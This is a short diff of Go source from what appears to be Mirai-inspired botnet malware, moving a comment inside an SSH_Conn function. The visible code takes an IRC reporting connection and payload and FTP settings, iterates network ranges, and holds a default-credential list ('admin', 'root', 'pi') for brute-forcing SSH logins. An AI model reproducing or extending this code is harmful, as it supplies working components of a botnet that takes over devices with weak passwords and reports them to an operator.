@@ -104,9 +104,6 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 	session.Close()
 }
 
-/*
-	Add more usernames and passwords in to The array name "userList" and "passList"
-*/
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
@@ -116,6 +113,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	/*
 		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
 		You can add more if you want.
+		Add more usernames and passwords in to The array name "userList" and "passList".
 	*/
 	userList := []string{
 		"admin", "root", "user", "guest", "support", "login", "pi",
